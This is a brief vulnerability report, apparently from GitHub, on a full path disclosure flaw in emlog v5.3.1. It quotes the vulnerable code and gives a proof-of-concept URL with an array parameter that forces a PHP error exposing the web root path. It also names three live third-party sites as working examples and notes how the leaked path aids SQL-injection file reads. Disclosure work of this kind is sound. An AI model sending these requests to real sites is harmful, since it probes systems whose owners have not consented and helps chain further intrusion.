emlog v5.3.1 has Full Path Disclosure vulnerability

emlog is a fast, stable and easy-to-use blog and CMS website building system based on PHP and MySQL.

site: <https://www.emlog.net/em_download/emlog/emlog_5.3.1.zip>

github: <https://github.com/emlog/>

vulnerability in t/index.php line 11:

`$action = isset($_GET['action']) ? addslashes($_GET['action']) : '';`

that uses a method of requesting a page like this:

`https://localhost/t/index.php?action=n`

We can use a method of opening and closing braces that causes the page to output an error. This method would look like this:

`https://localhost/t/index.php?action[]=aaaa`

This renders the page defunct thus spitting out an error:

`addslashes() expects parameter 1 to be string, array given in <b>/www/wwwroot/web/t/index.php</b> on line <b>11`

POC:

`http://127.0.0.1/t/index.php?action[]=aaaa`

[![image](https://github.com/thinkgad/Bugs/raw/main/images/ifs6g73f5feo3tv93e61lcuf35.png)](https://github.com/thinkgad/Bugs/blob/main/images/ifs6g73f5feo3tv93e61lcuf35.png)

Full Path Disclosure vulnerabilities enable the attacker to see the path to the webroot/file. Certain vulnerabilities, such as using the load\_file() (within a SQL Injection) query to view the page source, require the attacker to have the full path to the file they wish to view.

Examples:

```
view-source:https://www.jiquan123.cn/t/index.php?action[]=aaaa
view-source:https://www.zlrsl.cn/t/index.php?action[]=aaaa
view-source:https://dxs32.cn/t/index.php?action[]=aaaa

```
